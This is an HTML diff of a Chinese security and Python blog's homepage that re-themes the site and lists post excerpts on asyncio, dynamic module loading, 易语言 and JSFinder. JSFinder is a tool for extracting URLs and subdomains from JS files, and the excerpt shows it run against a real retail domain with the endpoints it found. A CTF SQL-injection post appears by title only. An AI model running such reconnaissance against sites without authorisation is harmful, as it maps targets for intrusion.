@@ -1,19 +1,58 @@
 <!DOCTYPE html>
 
 
-  <html class="light page-home">
 
 
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="utf-8">
-  
-  <title>Threezh1&#39;s blog</title>
 
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<html lang="Chinese">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
+  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
 
-  
-    <meta name="keywords" content="Threezh1">
-  
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.3.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    }
+  };
+</script>
 
   <meta name="description" content="Share learn &amp; Share life.">
 <meta name="keywords" content="Threezh1">
@@ -26,155 +65,1622 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Threezh1&#39;s blog">
 <meta name="twitter:description" content="Share learn &amp; Share life.">
-
-  
-
-  
-    <link rel="icon" href="/favicon.ico">
-  
-
-  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+  <link rel="canonical" href="http://yoursite.com/">
 
 
-  
-    <link rel="stylesheet" href="/css/personal-style.css">
-  
-
-  
-
-  
-
-  
-
-
-  
-    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
-  
-
-</head>
-</html>
-<body>
-
-
-  
-
-  
-  <div class="content-home text-center">
-  <a class="avatar" href="/">
-    <img src="https://i.loli.net/2019/05/17/5cde2a10a5e3675955.jpg" alt>
-  </a>
-  <h1 class="name" style="font-family: Lobster-Regular">
-    Threezh1&#39;s blog
-  </h1>
-  <div class="slogan">
-    Share Learning &amp; Share Life
-  </div>
-
-  <hr>
-
-  <ul class="text-center nav">
-    
-      <li class="item">
-        
-          <a href="/archives">Blog</a>
-        
-        <span>|</span>
-      </li>
-    
-  </ul>
-
-</div>
-
-
-
-
-
-  <div class="modal" id="modal">
-  <span id="cover" class="cover hide"></span>
-  <div id="modal-dialog" class="modal-dialog hide-dialog">
-    <div class="modal-header">
-      <span id="close" class="btn-close">关闭</span>
-    </div>
-    <hr>
-    <div class="modal-body">
-      <ul class="list-toolbox">
-        
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/archives/" rel="noopener noreferrer" target="_self">
-              博客
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/category/" rel="noopener noreferrer" target="_self">
-              分类
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/tag/" rel="noopener noreferrer" target="_self">
-              标签
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/link/" rel="noopener noreferrer" target="_self">
-              友链
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="/about/" rel="noopener noreferrer" target="_self">
-              关于
-            </a>
-          </li>
-        
-          <li class="item-toolbox">
-            <a class="ROUND_RECT" href="http://119.3.219.188/" rel="noopener noreferrer" target="_blank">
-              Threeday
-            </a>
-          </li>
-        
-      </ul>
-
-    </div>
-  </div>
-</div>
-
-
-
-  
-
-  <script type="text/javascript">
-  function loadScript(url, callback) {
-    var script = document.createElement('script')
-    script.type = 'text/javascript';
-
-    if (script.readyState) { //IE
-      script.onreadystatechange = function() {
-        if (script.readyState == 'loaded' ||
-          script.readyState == 'complete') {
-          script.onreadystatechange = null;
-          callback();
-        }
-      };
-    } else { //Others
-      script.onload = function() {
-        callback();
-      };
-    }
-
-    script.src = url;
-    document.getElementsByTagName('head')[0].appendChild(script);
-  }
-
-  window.onload = function() {
-    loadScript('/js/bundle.js?235683', function() {
-      // load success
-    });
-  }
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: true,
+    isPost: false,
+    isPage: false,
+    isArchive: false
+  };
 </script>
 
+  <title>Threezh1's blog</title>
+  <meta name="generator" content="Hexo 3.8.0">
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Threezh1's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">分享学习、分享想法</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-threeday">
+      
+    
+
+    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content page-home">
+            
+  <section id="posts" class="posts-expand">
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/22/简单的协程利用框架/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/08/22/简单的协程利用框架/" class="post-title-link" itemprop="url">协程初体验之简单的利用框架</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-08-22 21:26:14" itemprop="dateCreated datePublished" datetime="2019-08-22T21:26:14+08:00">2019-08-22</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:10:46" itemprop="dateModified" datetime="2019-08-23T14:10:46+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><em>Threezh1 2019年8月22日</em></p>
+<p>最近在接触一下协程，上手不易，拖了很长时间才把这个小框架完成。有些地方很简陋，后面慢慢完善吧。</p>
+<p>做这个的想法是方便自己后面编写需要用到协程的脚本。(还有忘记协程的知识点了就过来复习)</p>
+<h2 id="先看框架"><a href="#先看框架" class="headerlink" title="先看框架"></a>先看框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio, functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SomeFunction</span><span class="params">(parameter)</span>:</span></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	这里是目标函数，脚本的功能都应在此函数当中。</span></span><br><span class="line"><span class="string">	参数个数都由自己确定，需要与functools.partial调用的参数一致。</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> parameter</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">coroutine_execution</span><span class="params">(function, param1)</span>:</span></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	通过run_in_executor方法来新建一个线程来执行耗时函数。</span></span><br><span class="line"><span class="string">	注意：functools.partial调用的参数应与目标函数一致</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	loop = asyncio.get_event_loop()</span><br><span class="line">	result = <span class="keyword">await</span> loop.run_in_executor(<span class="literal">None</span>,functools.partial(function, parameter=param1)) </span><br><span class="line">	<span class="comment"># result为目标函数返回的值</span></span><br><span class="line">	print(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coroutine_init</span><span class="params">(function, parameters, threads)</span>:</span></span><br><span class="line">	<span class="string">"""</span></span><br><span class="line"><span class="string">	处理线程</span></span><br><span class="line"><span class="string">	coroutine_execution()调用协程函数，可自行修改参数个数内容等。 </span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	times = int(len(parameters) / threads) + <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> len(parameters) == threads: times -= <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> range(times):</span><br><span class="line">		tasks = []</span><br><span class="line">		Minimum = threads * num</span><br><span class="line">		Maximum = threads * (num + <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> num == times - <span class="number">1</span> <span class="keyword">and</span> len(parameters) % threads != <span class="number">0</span>:</span><br><span class="line">			Minimum = (times - <span class="number">1</span>) * threads</span><br><span class="line">			Maximum = len(parameters)</span><br><span class="line">		<span class="keyword">if</span> len(parameters) &lt;= threads:</span><br><span class="line">			Minimum = <span class="number">0</span></span><br><span class="line">			Maximum = len(parameters)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(Minimum, Maximum):</span><br><span class="line">			<span class="comment"># 此处的parameters[i]就是取目标参数的单个值，可自行调整</span></span><br><span class="line">			future = asyncio.ensure_future(coroutine_execution(function, param1=parameters[i]))</span><br><span class="line">			tasks.append(future)</span><br><span class="line">		loop = asyncio.get_event_loop()</span><br><span class="line">		loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">		print(<span class="string">"[*] The &#123;&#125;th thread ends"</span>.format(str(num + <span class="number">1</span>)))</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	words = [<span class="string">"Hello World."</span>, <span class="string">"I'm Threezh1."</span>, <span class="string">"Welcome to my blog."</span>, <span class="string">"One"</span>, <span class="string">"Tow"</span>, <span class="string">"Three"</span>, <span class="string">"Four"</span>]</span><br><span class="line">	coroutine_init(SomeFunction, parameters=words, threads=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/08/22/简单的协程利用框架/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/12/Python动态加载模块的几种方式/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/07/12/Python动态加载模块的几种方式/" class="post-title-link" itemprop="url">Python动态加载模块、类、函数的几种方式</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-07-12 01:07:40" itemprop="dateCreated datePublished" datetime="2019-07-12T01:07:40+08:00">2019-07-12</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:18:20" itemprop="dateModified" datetime="2019-08-23T14:18:20+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="1-exec"><a href="#1-exec" class="headerlink" title="1. exec()"></a>1. exec()</h2><p>使用exec来执行Python导入模块的命令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">module_name = <span class="string">"module01"</span></span><br><span class="line">exec(<span class="string">"import "</span> + module_name)</span><br><span class="line">module01.echo()</span><br></pre></td></tr></table></figure>
+<h2 id="2-import"><a href="#2-import" class="headerlink" title="2. __import__()"></a>2. <code>__import__()</code></h2><p>单独使用<code>__import__()</code> 可以直接加载模块，但是当需要动态加载类、函数时，就需要配合getattr来实现。</p>
+<p>实现步骤：</p>
+<ol>
+<li>获取模块名(module_name)</li>
+<li>使用<code>__import__(module_name)</code>导入Python模块</li>
+<li>使用<code>getattr(module_name, class_name/function_name)</code>获取类、方法的对象
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/12/Python动态加载模块的几种方式/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </li></ol></div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/11/关于易语言与Python的一点想法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/07/11/关于易语言与Python的一点想法/" class="post-title-link" itemprop="url">关于易语言与Python的一点想法</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-07-11 01:50:41" itemprop="dateCreated datePublished" datetime="2019-07-11T01:50:41+08:00">2019-07-11</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:20" itemprop="dateModified" datetime="2019-08-23T14:19:20+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/胡思乱想/" itemprop="url" rel="index"><span itemprop="name">胡思乱想</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>最近吃饭的时候总是会想很多关于易语言的事情。易语言是我学会的第一门语言，虽然它被喷的很惨很惨，具体可见：<a href="https://www.zhihu.com/topic/19706107/hot" target="_blank" rel="noopener">易语言 知乎</a>。但是由于它极高的上手性，还是成为我高中时期最喜欢的编程工具。(当时我还没听说过Python)易语言画界面是非常简单的，用鼠标拖动一下组件，简简单单的几句代码就可以写一个简单的GUI程序。我想，在界面化的程序上，除了Web程序上用Javascript和CSS画界面。对于我这样懒惰的人，易语言无非是一个比较好的选择。Python，熟悉易语言的我在刚学Python时极度不适应，但是在学习了一段时间之后，我就改变了我的想法，Python真的太舒服了…</p>
+<p>不说得太远了，先说下我最近的想法(疑问)：</p>
+<ol>
+<li>易语言能和Python结合起来吗？</li>
+<li>结合的方式应该是怎样的？</li>
+<li>结合起来有什么用？</li>
+</ol>
+<p>在自问自答上面的问题之前，先来看一看易语言与Python有什么不同点：</p>
+<h2 id="易语言与Python的不同"><a href="#易语言与Python的不同" class="headerlink" title="易语言与Python的不同"></a>易语言与Python的不同</h2><p>先来看看易语言与Python编程环境的不同：</p>
+<ul>
+<li>易语言：</li>
+</ul>
+<p><img src="https://i.loli.net/2019/07/11/5d2624b473b7970443.jpg" alt="environment_e.jpg"></p>
+<p><img src="https://i.loli.net/2019/07/11/5d2624b05ea9896024.jpg" alt="environment_e_script.jpg"></p>
+<p>易语言这个弹出输入的内容，我只写了一行代码，其他的只是组件的大小和位置，这些易语言都已经安排好了，只需要添加参数即可。</p>
+<p>那用Python写一个这样的弹出输入框的程序需要多少行代码呢？<br>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/11/关于易语言与Python的一点想法/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </p></div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/10/JSFinder/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/06/10/JSFinder/" class="post-title-link" itemprop="url">JSFinder 一个从JS文件中获取url和子域名的工具</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-06-10 20:46:26" itemprop="dateCreated datePublished" datetime="2019-06-10T20:46:26+08:00">2019-06-10</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:17:36" itemprop="dateModified" datetime="2019-08-23T14:17:36+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/project/" itemprop="url" rel="index"><span itemprop="name">project</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>项目地址：<a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p>
+<h2 id="关于-JSFinder"><a href="#关于-JSFinder" class="headerlink" title="关于 JSFinder"></a>关于 JSFinder</h2><p>JSFinder is a tool for quickly extracting URLs and subdomains from JS files on a website.</p>
+<p>JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。</p>
+<p>提取URL的正则部分使用的是<a href="https://github.com/GerbenJavado/LinkFinder" target="_blank" rel="noopener">LinkFinder</a> </p>
+<p>By     : Threezh1</p>
+<p>Blog: <a href="https://threezh1.github.io/" target="_blank" rel="noopener">https://threezh1.github.io/</a></p>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ul>
+<li><strong>简单爬取</strong></li>
+</ul>
+<p><code>python JSFinder.py -u http://www.mi.com</code></p>
+<p>这个命令会爬取 <a href="http://www.mi.com" target="_blank" rel="noopener">http://www.mi.com</a> 这单个页面的所有的js链接，并在其中发现url和子域名</p>
+<p>返回示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">url:http://www.mi.com                                         </span><br><span class="line">Find 50 URL:                                                  </span><br><span class="line">http://api-order.test.mi.com                                  </span><br><span class="line">http://api.order.mi.com                                       </span><br><span class="line">http://userid.xiaomi.com/userId                               </span><br><span class="line">http://order.mi.com/site/login?redirectUrl=                                                   </span><br><span class="line">...已省略                            </span><br><span class="line">                                                              </span><br><span class="line">Find 26 Subdomain:                                            </span><br><span class="line">api-order.test.mi.com                                         </span><br><span class="line">api.order.mi.com                                              </span><br><span class="line">userid.xiaomi.com                                             </span><br><span class="line">order.mi.com                                                                                              </span><br><span class="line">...已省略</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/06/10/JSFinder/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/09/从CTF题中学习几种有趣(奇怪)的SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/06/09/从CTF题中学习几种有趣(奇怪)的SQL注入/" class="post-title-link" itemprop="url">从CTF题中学习几种有趣(奇怪)的SQL注入</a>
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-06-09 12:37:58" itemprop="dateCreated datePublished" datetime="2019-06-09T12:37:58+08:00">2019-06-09</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-23 14:19:14" itemprop="dateModified" datetime="2019-08-23T14:19:14+08:00">2019-08-23</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
